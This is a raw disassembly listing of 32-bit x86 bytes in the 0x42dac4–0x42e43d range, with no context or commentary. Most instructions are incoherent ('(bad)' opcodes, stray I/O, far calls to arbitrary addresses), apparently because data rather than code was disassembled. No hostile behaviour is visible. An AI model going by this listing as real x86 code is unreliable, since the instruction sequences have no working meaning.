  42dac4:	sbb    ebx,ebx
  42dac6:	inc    esp
  42dac7:	cmc    
  42dac8:	push   esi
  42dac9:	aad    0xd6
  42dacb:	popa   
  42dacc:	mov    ebp,0xd7bf8fdc
  42dad1:	jg     0x42da74
  42dad3:	push   edi
  42dad4:	pop    ebx
  42dad5:	(bad)  
  42dad6:	imul   ecx,DWORD PTR [eax+0x63],0x3e838107
  42dadd:	iret   
  42dade:	push   edi
  42dadf:	dec    ebx
  42dae0:	sbb    al,0x9a
  42dae2:	adc    edi,edx
  42dae4:	or     al,0xc2
  42dae6:	xlat   BYTE PTR ds:[ebx]
  42dae7:	pusha  
  42dae8:	repz aaa 
  42daea:	mov    al,ds:0x838659f0
  42daef:	inc    edi
  42daf0:	cmp    cl,BYTE PTR [edi-0xc]
  42daf3:	or     DWORD PTR [ebp+edx*4-0xc6ca299],ebx
  42dafa:	xchg   esp,eax
  42dafb:	pusha  
  42dafc:	sub    DWORD PTR [edx+0x38c624bb],ecx
  42db02:	in     eax,0x78
  42db04:	jb     0x42da88
  42db06:	adc    BYTE PTR [edx],0x3
  42db09:	mov    ah,bh
  42db0b:	sbb    al,0xfe
  42db0d:	adc    dh,dh
  42db0f:	or     ecx,DWORD PTR [ecx+0x41]
  42db12:	cmp    eax,0xae64a720
  42db17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db18:	lods   al,BYTE PTR ds:[esi]
  42db19:	es inc esi
  42db1b:	out    0x4a,eax
  42db1d:	int    0x8a
  42db1f:	jnp    0x42daf9
  42db21:	sub    bl,BYTE PTR [esp+esi*2-0x11ed265f]
  42db28:	(bad)  
  42db29:	push   ebp
  42db2a:	and    eax,0x1fdfc480
  42db2f:	outs   dx,BYTE PTR ds:[esi]
  42db30:	jae    0x42db3e
  42db32:	mov    esp,esi
  42db34:	call   FWORD PTR [esi-0x3401f0bf]
  42db3a:	stos   DWORD PTR es:[edi],eax
  42db3b:	sub    BYTE PTR [bp-0x15b2],0x86
  42db41:	mov    ah,0x62
  42db43:	les    ebx,FWORD PTR [esi]
  42db45:	or     DWORD PTR [eax+ecx*2-0x3a99cbdb],edx
  42db4c:	retf   0x7fd1
  42db4f:	push   es
  42db50:	imul   DWORD PTR [edx]
  42db52:	sbb    dh,BYTE PTR [eax-0x3b]
  42db55:	jge    0x42db9d
  42db57:	mov    ?,WORD PTR [ecx]
  42db59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db5a:	aaa    
  42db5b:	adc    ebp,DWORD PTR [eax-0x32]
  42db5e:	xor    DWORD PTR [ebx-0x77e2ebd2],eax
  42db64:	jae    0x42db4a
  42db66:	cwde   
  42db67:	cmp    esi,DWORD PTR ds:0xa7834b47
  42db6d:	sbb    al,BYTE PTR [eax]
	...
  42dbd3:	add    BYTE PTR [eax],al
  42dbd5:	add    BYTE PTR [eax-0x2093e086],dh
  42dbdb:	ins    DWORD PTR es:[edi],dx
  42dbdc:	repz (bad) 
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42dbef
  42dbe3:	adc    al,bl
  42dbe5:	xor    ah,BYTE PTR [edi-0x16]
  42dbe8:	add    DWORD PTR [eax],eax
  42dbea:	add    BYTE PTR [ecx],al
  42dbec:	add    BYTE PTR [eax],al
  42dbee:	jle    0x42dbba
  42dbf0:	fstp   TBYTE PTR [edi]
  42dbf2:	push   ds
  42dbf3:	xchg   ebp,eax
  42dbf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbf5:	enter  0xe1d7,0xb3
  42dbf9:	xchg   ecx,eax
  42dbfa:	push   esi
  42dbfb:	call   0xbcfe:0x331f459e
  42dc02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc03:	imul   eax,DWORD PTR [ebx],0x2d7f23d9
  42dc09:	push   edi
  42dc0a:	xchg   esi,eax
  42dc0b:	push   0x1c
  42dc0d:	aas    
  42dc0e:	cmp    dh,BYTE PTR [edx+0x20]
  42dc11:	mov    al,ds:0x1f00f926
  42dc16:	pop    edi
  42dc17:	push   0xb6d68966
  42dc1c:	popa   
  42dc1d:	mov    dl,0xab
  42dc1f:	lods   al,BYTE PTR ds:[esi]
  42dc20:	mov    ecx,0x364b22f9
  42dc25:	push   ebp
  42dc26:	(bad)  
  42dc27:	int    0xc4
  42dc29:	sbb    eax,0x3f9ec275
  42dc2e:	in     al,dx
  42dc2f:	mov    dh,0x35
  42dc31:	mov    esi,ds
  42dc33:	pop    edi
  42dc34:	mov    ch,BYTE PTR [ebp-0x78]
  42dc37:	ds push eax
  42dc39:	xchg   ebp,eax
  42dc3a:	ja     0x42dbd5
  42dc3c:	xchg   BYTE PTR [edi],bh
  42dc3e:	mov    dh,cl
  42dc40:	fcmovb st,st(7)
  42dc42:	into   
  42dc43:	frstor [edx+eax*8+0x54]
  42dc47:	jmp    0xd0a759a1
  42dc4c:	aas    
  42dc4d:	aas    
  42dc4e:	xchg   esp,eax
  42dc4f:	xlat   BYTE PTR ds:[ebx]
  42dc50:	pop    ecx
  42dc51:	out    0x63,eax
  42dc53:	xchg   esi,eax
  42dc54:	jmp    0x42dc85
  42dc56:	(bad)  
  42dc57:	mov    bl,0x5
  42dc59:	inc    eax
  42dc5a:	xchg   ecx,eax
  42dc5b:	ror    DWORD PTR [eax],1
  42dc5d:	daa    
  42dc5e:	(bad)  
  42dc5f:	mov    edx,DWORD PTR [ebx]
  42dc61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc62:	je     0x42dbf4
  42dc64:	outs   dx,DWORD PTR ds:[esi]
  42dc65:	mov    edi,0x2045914d
  42dc6b:	es mov ebp,0x8cd13122
  42dc71:	(bad)  
  42dc72:	fbstp  TBYTE PTR [edx-0x64]
  42dc75:	add    BYTE PTR [ebx+0x40],dh
  42dc78:	sbb    ch,dh
  42dc7a:	jge    0x42dccc
  42dc7c:	cld    
  42dc7d:	jl     0x42dc1e
  42dc7f:	js     0x42dc98
  42dc81:	and    DWORD PTR [edi-0x54abc554],0x9
  42dc88:	adc    al,0xe6
  42dc8a:	retf   0x5a52
  42dc8d:	dec    eax
  42dc8e:	cmp    ch,ah
  42dc90:	outs   dx,DWORD PTR ds:[esi]
  42dc91:	xor    esp,DWORD PTR [ebx-0x67]
  42dc94:	imul   BYTE PTR [ebx-0x779fe25c]
  42dc9a:	sub    bl,bh
  42dc9c:	sub    eax,0xdd6caba
  42dca1:	mov    ch,0x74
  42dca3:	gs mov ah,0xc3
  42dca6:	in     al,dx
  42dca7:	xor    bh,cl
  42dca9:	in     eax,dx
  42dcaa:	lods   eax,DWORD PTR ds:[esi]
  42dcab:	mov    ss,WORD PTR [edi]
  42dcad:	adc    al,BYTE PTR [ebx-0x7ab2fdf8]
  42dcb3:	or     BYTE PTR [eax+0x689ef914],dl
  42dcb9:	dec    eax
  42dcba:	das    
  42dcbb:	aad    0xec
  42dcbd:	jmp    0x3c299e68
  42dcc2:	in     eax,dx
  42dcc3:	clc    
  42dcc4:	std    
  42dcc5:	mov    ebp,DWORD PTR [ecx-0x21]
  42dcc8:	pop    eax
  42dcc9:	sub    eax,DWORD PTR [edx+esi*8+0x4]
  42dccd:	fs retf 
  42dccf:	out    dx,al
  42dcd0:	jp     0x42dc8b
  42dcd2:	mov    bl,0x97
  42dcd4:	shl    ecx,cl
  42dcd6:	in     al,dx
  42dcd7:	inc    eax
  42dcd8:	push   0xffffffce
  42dcda:	add    BYTE PTR [esp+esi*1+0x44b769c0],ch
  42dce1:	stos   BYTE PTR es:[edi],al
  42dce2:	call   0xd620:0x205648ab
  42dce9:	hlt    
  42dcea:	lds    ebp,FWORD PTR ds:0x234d
	...
  42dd54:	add    BYTE PTR [eax],al
  42dd56:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	aam    0xcb
  42dd64:	jg     0x42dd1d
  42dd66:	addr16 jmp 0x42dd6a
  42dd69:	add    BYTE PTR [eax],al
  42dd6b:	add    DWORD PTR [eax],eax
  42dd6d:	add    dh,dh
  42dd6f:	repnz mov al,0xeb
  42dd72:	out    dx,eax
  42dd73:	popf   
  42dd74:	adc    eax,0xe54fb586
  42dd79:	pop    eax
  42dd7a:	sbb    BYTE PTR [esp],al
  42dd7d:	mov    dh,al
  42dd7f:	ror    ecx,cl
  42dd81:	in     al,0x33
  42dd83:	pop    esp
  42dd84:	into   
  42dd85:	pop    edi
  42dd86:	jmp    FWORD PTR [ebx-0xd]
  42dd89:	mov    edi,0x7cc5dd69
  42dd8e:	xchg   ebp,eax
  42dd8f:	or     eax,0x7c8f3aa9
  42dd94:	int3   
  42dd95:	mov    ecx,edi
  42dd97:	push   es
  42dd98:	ror    DWORD PTR [ecx],cl
  42dd9a:	mov    esi,0xe1062b27
  42dd9f:	xor    esi,ebp
  42dda1:	daa    
  42dda2:	jl     0x42dd29
  42dda4:	rol    ebx,1
  42dda6:	push   esi
  42dda7:	jno    0x42de00
  42dda9:	cwde   
  42ddaa:	add    al,0x6a
  42ddac:	jmp    0xa3c9:0xc1e83bac
  42ddb3:	cmc    
  42ddb4:	gs pushf 
  42ddb6:	and    ch,ch
  42ddb8:	dec    ecx
  42ddb9:	inc    esp
  42ddba:	mov    DWORD PTR [edx+0x31],0xc4173ab9
  42ddc1:	daa    
  42ddc2:	jge    0x42de2c
  42ddc4:	pop    ebp
  42ddc5:	mov    ah,0xff
  42ddc7:	or     al,0x31
  42ddc9:	stos   BYTE PTR es:[edi],al
  42ddca:	mov    ss,ebx
  42ddcc:	cli    
  42ddcd:	cmp    BYTE PTR [esi],bl
  42ddcf:	fwait
  42ddd0:	pop    es
  42ddd1:	out    0xbf,eax
  42ddd3:	ss adc esi,ecx
  42ddd6:	mov    edi,0x3a5e380c
  42dddb:	sahf   
  42dddc:	dec    esi
  42dddd:	aaa    
  42ddde:	xlat   BYTE PTR ds:[ebx]
  42dddf:	mov    ds:0x42bf7151,al
  42dde4:	aaa    
  42dde5:	or     esi,edi
  42dde7:	or     al,0x66
  42dde9:	cmp    eax,0x8b57d6c8
  42ddee:	out    dx,al
  42ddef:	ret    0x1a5a
  42ddf2:	fs push ebx
  42ddf4:	xor    ebp,DWORD PTR [edx]
  42ddf6:	mov    edi,0x61bcd471
  42ddfb:	call   0x3cc0:0x23c8a6bd
  42de02:	adc    al,0xd1
  42de04:	ret    
  42de05:	jecxz  0x42ddff
  42de07:	lods   eax,DWORD PTR ds:[esi]
  42de08:	pop    edi
  42de09:	mov    ss,WORD PTR gs:[edi-0x760ac796]
  42de10:	mov    al,0x42
  42de12:	ja     0x42ddfa
  42de14:	je     0x42de7c
  42de16:	xchg   esp,eax
  42de17:	ret    0x41fc
  42de1a:	mov    dh,0xa
  42de1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42de1d:	bound  esi,QWORD PTR [edx-0x75]
  42de20:	scas   al,BYTE PTR es:[edi]
  42de21:	fmul   QWORD PTR [ebx+0x3e]
  42de24:	mov    ecx,0xbf863e58
  42de29:	shr    ebx,0xa6
  42de2c:	(bad)  
  42de2d:	shl    DWORD PTR [edi-0x3c],1
  42de30:	nop
  42de31:	adc    ecx,DWORD PTR [ebp+0x3c]
  42de34:	push   ss
  42de35:	neg    DWORD PTR [eax]
  42de37:	sbb    eax,0xc4524827
  42de3c:	pop    es
  42de3d:	fistp  DWORD PTR [ebp-0x28]
  42de40:	pop    edi
  42de41:	scas   al,BYTE PTR es:[edi]
  42de42:	clc    
  42de43:	je     0x42de86
  42de45:	or     BYTE PTR [edx+0x21],ah
  42de48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de49:	mov    ah,0x52
  42de4b:	cld    
  42de4c:	lea    ecx,[edx+0x4a130680]
  42de52:	pop    ss
  42de53:	cmp    BYTE PTR [esi+0x23f51100],cl
  42de59:	push   edx
  42de5a:	xor    DWORD PTR [edi-0x60],esi
  42de5d:	mov    eax,ds:0x20e470c4
  42de62:	fcom   QWORD PTR [edi+0x67]
  42de65:	jnp    0x42de9f
  42de67:	inc    esp
  42de68:	and    BYTE PTR [edx+0x53cd68a1],bl
	...
  42ded6:	out    0x82,al
  42ded8:	lods   eax,DWORD PTR ds:[esi]
  42ded9:	xor    ebp,ebp
  42dedb:	aas    
  42dedc:	(bad)  
  42dedd:	xlat   BYTE PTR ds:[ebx]
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	pusha  
  42dee3:	mov    DWORD PTR [ebx+0x55],edx
  42dee6:	addr16 in al,dx
  42dee8:	add    DWORD PTR [eax],eax
  42deea:	add    BYTE PTR [ecx],al
  42deec:	add    BYTE PTR [eax],al
  42deee:	xchg   ebx,eax
  42deef:	mov    dh,0x7b
  42def1:	cs dec ebp
  42def3:	mov    edi,0x3a7b4e8d
  42def8:	inc    eax
  42def9:	call   FWORD PTR [edx+0x378dc59]
  42deff:	fsub   QWORD PTR [ebx+edx*4-0x4e68a3c0]
  42df06:	dec    edi
  42df07:	jmp    ecx
  42df09:	add    al,bl
  42df0b:	je     0x42deb8
  42df0d:	imul   edx,DWORD PTR ds:0xe458bd54,0xfffffffe
  42df14:	aad    0xf2
  42df16:	ja     0x42de9d
  42df18:	sub    ebp,edi
  42df1a:	jp     0x42dee9
  42df1c:	stos   DWORD PTR es:[edi],eax
  42df1d:	das    
  42df1e:	xchg   edx,eax
  42df1f:	push   cs
  42df20:	imul   esp,edi,0x25
  42df23:	adc    eax,0x77557f7b
  42df28:	xor    BYTE PTR [edi+0x2cf3a61],cl
  42df2e:	mov    ds:0x9ad33845,eax
  42df33:	push   ebx
  42df34:	jbe    0x42df91
  42df36:	add    ah,dh
  42df38:	push   ebp
  42df39:	mov    edi,0xc71e7036
  42df3e:	inc    edi
  42df3f:	dec    edx
  42df40:	les    edi,FWORD PTR [ebp+0xbba386f]
  42df46:	xor    esi,DWORD PTR [ebp-0x46]
  42df49:	mov    DWORD PTR [ecx+0x15269fd2],ecx
  42df4f:	ins    DWORD PTR es:[edi],dx
  42df50:	leave  
  42df51:	mov    bl,0x75
  42df53:	sub    ebx,DWORD PTR [ecx-0x4f]
  42df56:	ret    
  42df57:	xor    eax,0x1358c06f
  42df5c:	fwait
  42df5d:	inc    eax
  42df5e:	fstp   DWORD PTR [ebx-0x6c9f91fa]
  42df64:	addr16 addr16 loop 0x42dfb7
  42df68:	aas    
  42df69:	inc    eax
  42df6a:	push   0xffffffd1
  42df6c:	mov    ebx,0x3c1e1480
  42df71:	push   eax
  42df72:	or     BYTE PTR [ebx],ch
  42df74:	xlat   BYTE PTR ds:[ebx]
  42df75:	aas    
  42df76:	cli    
  42df77:	cwde   
  42df78:	fdivr  st(7),st
  42df7a:	push   0x36
  42df7c:	dec    eax
  42df7d:	xchg   BYTE PTR [edx+0x31834787],bh
  42df83:	dec    eax
  42df84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df85:	(bad)  
  42df86:	mov    edi,0x72c99976
  42df8b:	cmp    esi,esi
  42df8d:	clc    
  42df8e:	aaa    
  42df8f:	repz or DWORD PTR [edx+edi*8+0x57fb8d7b],eax
  42df97:	xor    dh,BYTE PTR [edi-0x2cf22373]
  42df9d:	(bad)  [ebp-0x51580f13]
  42dfa3:	or     esp,esp
  42dfa5:	xor    eax,0x3f7abc7b
  42dfaa:	dec    eax
  42dfab:	dec    edi
  42dfac:	sub    DWORD PTR [edx+0x5d],esi
  42dfaf:	call   0xde29:0x2d50245f
  42dfb6:	add    BYTE PTR [esi+0x54],dh
  42dfb9:	ja     0x42e008
  42dfbb:	call   esp
  42dfbd:	sub    edx,edx
  42dfbf:	mov    ds:0xf5a6baa,eax
  42dfc4:	addr16 push cs
  42dfc6:	inc    esi
  42dfc7:	out    dx,eax
  42dfc8:	das    
  42dfc9:	push   es
  42dfca:	or     edi,DWORD PTR [eax-0x75]
  42dfcd:	xchg   edx,eax
  42dfce:	(bad)  
  42dfcf:	js     0x42df5c
  42dfd1:	adc    al,0xa
  42dfd3:	scas   eax,DWORD PTR es:[edi]
  42dfd4:	xor    al,0xc6
  42dfd6:	stos   DWORD PTR es:[edi],eax
  42dfd7:	adc    DWORD PTR [esi-0x5f],esi
  42dfda:	jp     0x42dfdd
  42dfdc:	xchg   ecx,eax
  42dfdd:	jle    0x42e021
  42dfdf:	cmp    eax,0xa7844d32
  42dfe4:	addr16 test cl,al
  42dfe7:	rcl    BYTE PTR [ebx],cl
  42dfe9:	inc    ebp
  42dfea:	lods   eax,DWORD PTR ds:[esi]
  42dfeb:	sbb    BYTE PTR [edi+edi*1+0x0],dh
	...
  42e053:	add    BYTE PTR [eax],al
  42e055:	add    BYTE PTR [edx],al
  42e057:	(bad)  
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi-0x4b]
  42e063:	pop    ds
  42e064:	sahf   
  42e065:	adc    al,0x67
  42e067:	in     eax,dx
  42e068:	add    DWORD PTR [eax],eax
  42e06a:	add    BYTE PTR [ecx],al
  42e06c:	add    BYTE PTR [eax],al
  42e06e:	mov    edi,0xed426904
  42e073:	in     eax,dx
  42e074:	fimul  WORD PTR [edx]
  42e076:	lahf   
  42e077:	int3   
  42e078:	loop   0x42e00a
  42e07a:	(bad)  
  42e07b:	push   edx
  42e07c:	and    ebx,DWORD PTR [ebx-0x6f8f12e9]
  42e082:	in     al,0x94
  42e084:	out    0xb3,al
  42e086:	icebp  
  42e087:	call   0x990b8bb5
  42e08c:	mov    al,ds:0xf1a912c3
  42e091:	(bad)  
  42e092:	cmp    BYTE PTR [esi],ch
  42e094:	push   0xffffff8f
  42e096:	les    eax,FWORD PTR [eax+0x5b4a6b85]
  42e09c:	pop    esi
  42e09d:	cdq    
  42e09e:	xor    BYTE PTR [ecx+0x35d1c784],dh
  42e0a4:	push   ds
  42e0a5:	sbb    BYTE PTR [esp+eiz*4+0x3a6d8c11],bh
  42e0ac:	aad    0x46
  42e0ae:	add    dl,cl
  42e0b0:	fidivr WORD PTR [esi+0x9089c24]
  42e0b6:	lods   al,BYTE PTR ds:[esi]
  42e0b7:	inc    eax
  42e0b8:	dec    edi
  42e0b9:	aaa    
  42e0ba:	int    0x51
  42e0bc:	xchg   DWORD PTR [edi-0x78517976],ebx
  42e0c2:	cmp    al,0x4f
  42e0c4:	jg     0x42e0c3
  42e0c6:	mov    ds:0x938f36e3,al
  42e0cb:	shl    BYTE PTR [ecx+0x16286a7d],1
  42e0d1:	jnp    0x42e132
  42e0d3:	idiv   DWORD PTR [ebp+0xbaf1c24]
  42e0d9:	pop    ebp
  42e0da:	test   DWORD PTR [edx-0x47],0x56c1a317
  42e0e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e0e2:	loop   0x42e0a0
  42e0e4:	xchg   edi,eax
  42e0e5:	es dec edi
  42e0e7:	scas   al,BYTE PTR es:[edi]
  42e0e8:	or     eax,esp
  42e0ea:	push   ss
  42e0eb:	pushf  
  42e0ec:	dec    esi
  42e0ed:	fmul   QWORD PTR [eax]
  42e0ef:	push   ebx
  42e0f0:	mov    eax,esp
  42e0f2:	cmc    
  42e0f3:	inc    ecx
  42e0f4:	fs sti 
  42e0f6:	shr    al,0xc7
  42e0f9:	rcl    BYTE PTR [edi+0x31],0x3b
  42e0fd:	(bad)
  42e100:	adc    esi,DWORD PTR [eax+esi*4-0x7206f5c3]
  42e107:	bound  esi,QWORD PTR [ebp-0x60]
  42e10a:	fs loop 0x42e0f8
  42e10d:	ins    DWORD PTR es:[edi],dx
  42e10e:	or     cl,BYTE PTR [eax-0x67]
  42e111:	fld    TBYTE PTR [edx-0x70]
  42e114:	xor    esp,esp
  42e116:	fdivr  DWORD PTR [ebx]
  42e118:	pop    es
  42e119:	ret    0xa383
  42e11c:	not    DWORD PTR [esi+0x6fc20b99]
  42e122:	shl    esi,cl
  42e124:	pop    esi
  42e125:	mov    edi,0xf33fe5b0
  42e12a:	(bad)  
  42e12b:	fild   QWORD PTR [ecx-0x476f8a4a]
  42e131:	inc    ebx
  42e132:	cmp    eax,0x8d73de89
  42e137:	pusha  
  42e138:	rcl    DWORD PTR [eax],1
  42e13a:	jnp    0x42e135
  42e13c:	jmp    0x92f1ad81
  42e141:	sbb    eax,0x358db4d4
  42e146:	lds    edx,FWORD PTR [ebx-0x606bde17]
  42e14c:	mov    ecx,0xa8d0e198
  42e151:	xor    eax,0xfe53c6d8
  42e156:	lods   eax,DWORD PTR ds:[esi]
  42e157:	pop    ss
  42e158:	mov    DWORD PTR [ecx-0x249c76a2],ecx
  42e15e:	push   eax
  42e15f:	jl     0x42e1b6
  42e161:	pop    edx
  42e162:	xor    DWORD PTR [eax+0x7f],ebp
  42e165:	pop    ebp
  42e166:	daa    
  42e167:	clc    
  42e168:	bswap  edx
  42e16a:	clc    
  42e16b:	fsubp  st(6),st
  42e16d:	mov    DWORD PTR [eax],eax
	...
  42e1d3:	add    BYTE PTR [eax],al
  42e1d5:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	jmp    0x42e1e2
  42e1e4:	mov    ds:0x1ee6744,al
  42e1e9:	add    BYTE PTR [eax],al
  42e1eb:	add    DWORD PTR [eax],eax
  42e1ed:	add    BYTE PTR [eax],al
  42e1ef:	xlat   BYTE PTR ds:[ebx]
  42e1f0:	cdq    
  42e1f1:	sub    cl,dh
  42e1f3:	xor    ebx,ebx
  42e1f5:	fstp   DWORD PTR [ebp-0x60]
  42e1f8:	sbb    eax,0x77b21c08
  42e1fd:	fsub   DWORD PTR [edi+0x6f]
  42e200:	dec    edi
  42e201:	dec    esi
  42e202:	mov    al,0x1f
  42e204:	mov    ds:0xd149af30,al
  42e209:	or     al,0x1e
  42e20b:	adc    dl,BYTE PTR [ebx-0x1fd9e9a1]
  42e211:	push   cs
  42e212:	sub    BYTE PTR [ebp-0x22f7f8b1],cl
  42e218:	popf   
  42e219:	rcr    DWORD PTR [esi-0x4e91ac1f],1
  42e21f:	dec    ecx
  42e220:	push   ebp
  42e221:	and    ch,BYTE PTR [edx]
  42e223:	cmp    eax,0xf9914c98
  42e228:	cli    
  42e229:	mul    BYTE PTR [ecx]
  42e22b:	lods   eax,DWORD PTR ds:[esi]
  42e22c:	pop    esp
  42e22d:	aaa    
  42e22e:	jb     0x42e25d
  42e230:	mov    ds:0xecf4c52d,al
  42e235:	cmc    
  42e236:	mov    al,0xf3
  42e238:	sti    
  42e239:	mov    al,0xa8
  42e23b:	cmp    ecx,esi
  42e23d:	xor    eax,0x58807765
  42e242:	and    al,0x3
  42e244:	ret    
  42e245:	out    dx,al
  42e246:	(bad)  [edx-0x5b]
  42e249:	or     bh,BYTE PTR [esi]
  42e24b:	mov    ecx,0x84d3fe68
  42e250:	pop    ebp
  42e251:	(bad)  
  42e252:	jle    0x42e221
  42e254:	xchg   ebx,eax
  42e255:	into   
  42e256:	ret    
  42e257:	inc    esp
  42e258:	push   0x68254830
  42e25d:	mov    eax,ds:0xe6d4fe23
  42e262:	mov    WORD PTR [edx],?
  42e264:	mov    ds:0x27940f65,al
  42e269:	shl    BYTE PTR [ebp+0x25724e7e],1
  42e26f:	jb     0x42e256
  42e271:	inc    eax
  42e272:	and    DWORD PTR [edx+ebp*2+0x79],edx
  42e276:	and    BYTE PTR [ebp-0x573bbdc],al
  42e27c:	stos   BYTE PTR es:[edi],al
  42e27d:	pop    ecx
  42e27e:	pop    ebp
  42e27f:	cwde   
  42e280:	data16 lock fdiv QWORD PTR [edi-0x308150b3]
  42e288:	xchg   BYTE PTR [eax],al
  42e28a:	ds cli 
  42e28c:	loop   0x42e283
  42e28e:	pusha  
  42e28f:	push   ds
  42e290:	fisub  WORD PTR ss:[ebp+0x1e8cb7fb]
  42e297:	ja     0x42e233
  42e299:	xchg   ebx,eax
  42e29a:	mov    ah,0xa6
  42e29c:	adc    eax,edx
  42e29e:	pusha  
  42e29f:	push   ecx
  42e2a0:	jns    0x42e245
  42e2a2:	pusha  
  42e2a3:	scas   eax,DWORD PTR es:[edi]
  42e2a4:	push   ebx
  42e2a5:	jp     0x42e2f6
  42e2a7:	lods   al,BYTE PTR ds:[esi]
  42e2a8:	(bad)  
  42e2a9:	(bad)  
  42e2aa:	jecxz  0x42e261
  42e2ac:	pushf  
  42e2ad:	xchg   ecx,eax
  42e2ae:	out    0x75,al
  42e2b0:	scas   eax,DWORD PTR es:[edi]
  42e2b1:	inc    esi
  42e2b2:	push   ebp
  42e2b3:	fwait
  42e2b4:	lahf   
  42e2b5:	cmc    
  42e2b6:	and    bh,BYTE PTR [ebx*1-0x7137ad44]
  42e2bd:	cs mov dh,0x17
  42e2c0:	push   edi
  42e2c1:	xchg   ebx,eax
  42e2c2:	pop    eax
  42e2c3:	out    dx,eax
  42e2c4:	and    al,0xb5
  42e2c6:	jge    0x42e2af
  42e2c8:	mov    ebp,0xfd02561f
  42e2cd:	stos   DWORD PTR es:[edi],eax
  42e2ce:	arpl   WORD PTR [ecx],ax
  42e2d0:	cmp    al,BYTE PTR [ebx+0x59]
  42e2d3:	sbb    bl,BYTE PTR [edi]
  42e2d5:	lahf   
  42e2d6:	sbb    DWORD PTR [ebx+0x4b38aae5],edi
  42e2dc:	ins    DWORD PTR es:[edi],dx
  42e2dd:	out    dx,eax
  42e2de:	inc    edi
  42e2df:	push   ebp
  42e2e0:	jno    0x42e355
  42e2e2:	mov    edi,0xe966f695
  42e2e7:	cmp    ch,BYTE PTR [ebx]
  42e2e9:	call   0x0:0x8945fd90
	...
  42e354:	add    BYTE PTR [eax],al
  42e356:	lods   eax,DWORD PTR ds:[esi]
  42e357:	cmp    eax,0xb79aa78a
  42e35c:	lods   eax,DWORD PTR ds:[esi]
  42e35d:	aas    
  42e35e:	mov    ebx,0xcc199140
  42e363:	scas   al,BYTE PTR es:[edi]
  42e364:	mov    WORD PTR [esi+0x67],fs
  42e367:	out    dx,eax
  42e368:	add    DWORD PTR [eax],eax
  42e36a:	add    BYTE PTR [ecx],al
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	mov    edx,0x1e347520
  42e373:	les    esp,FWORD PTR [ebp-0x3ba0f1b9]
  42e379:	(bad)  
  42e37a:	push   cs
  42e37b:	xor    cl,cl
  42e37d:	push   ebx
  42e37e:	nop
  42e37f:	outs   dx,DWORD PTR ds:[esi]
  42e380:	xchg   ebp,eax
  42e381:	inc    ebp
  42e382:	xor    eax,0xb14e6c54
  42e387:	test   dh,0x8f
  42e38a:	call   0xf24:0x6d1157d1
  42e391:	jnp    0x42e3f8
  42e393:	and    DWORD PTR [ebx-0x36d2be94],ecx
  42e399:	push   ecx
  42e39a:	imul   esi,DWORD PTR [ebp+0xe],0xc3d1a73b
  42e3a1:	rol    esi,1
  42e3a3:	aad    0x3e
  42e3a5:	call   0x5160:0x1669f2be
  42e3ac:	lods   al,BYTE PTR ds:[esi]
  42e3ad:	shl    BYTE PTR [ebx-0xc],1
  42e3b0:	inc    esi
  42e3b1:	ficom  DWORD PTR ds:0x16519c7f
  42e3b7:	mov    dl,0x54
  42e3b9:	sub    ch,BYTE PTR [eax-0x75]
  42e3bc:	xchg   ebp,eax
  42e3bd:	mov    al,0xd6
  42e3bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e3c0:	xor    bh,BYTE PTR [esi-0x38e19811]
  42e3c6:	mov    ds:0x84b0914b,al
  42e3cb:	sbb    al,BYTE PTR [edx]
  42e3cd:	pop    edi
  42e3ce:	xor    al,0xb6
  42e3d0:	cmp    al,0x5c
  42e3d2:	inc    esi
  42e3d3:	xchg   DWORD PTR [edi-0x29ea70dc],ebp
  42e3d9:	clc    
  42e3da:	into   
  42e3db:	jno    0x42e3a0
  42e3dd:	repz push edi
  42e3df:	aas    
  42e3e0:	inc    esi
  42e3e1:	or     eax,0xd23b34a7
  42e3e6:	add    ecx,DWORD PTR [ebp-0x43]
  42e3e9:	les    edx,FWORD PTR [ebx-0x7c88f2ed]
  42e3ef:	inc    ecx
  42e3f0:	loop   0x42e3c7
  42e3f2:	jo     0x42e3ed
  42e3f4:	cmp    al,BYTE PTR [ecx]
  42e3f6:	jg     0x42e449
  42e3f8:	addr16 retf 0xf42f
  42e3fc:	sahf   
  42e3fd:	fisub  WORD PTR [esi+0xf6f7881]
  42e403:	iret   
  42e404:	and    al,0xf8
  42e406:	xchg   ecx,eax
  42e407:	cmp    BYTE PTR [ebx-0x6],dl
  42e40a:	jg     0x42e392
  42e40c:	push   ecx
  42e40d:	call   0xe8147616
  42e412:	pop    ebp
  42e413:	int3   
  42e414:	push   esi
  42e415:	mov    BYTE PTR [ecx+0x75],ah
  42e418:	cmp    esp,DWORD PTR [eax+0x63601ab]
  42e41e:	pop    ds
  42e41f:	(bad)  
  42e420:	pop    ecx
  42e421:	das    
  42e422:	popa   
  42e423:	xor    cl,BYTE PTR [edx]
  42e425:	adc    al,0xb9
  42e427:	leave  
  42e428:	(bad)  
  42e429:	(bad)  
  42e42a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e42b:	pusha  
  42e42c:	xchg   BYTE PTR [ebx-0x76],bh
  42e42f:	xor    al,0xfd
  42e431:	pop    ebx
  42e432:	pop    eax
  42e433:	ret    0x8706
  42e436:	sub    esi,DWORD PTR [ebp+0x26]
  42e439:	jnp    0x42e487
  42e43b:	in     al,0xf
  42e43d:	jecxz  0x42e409
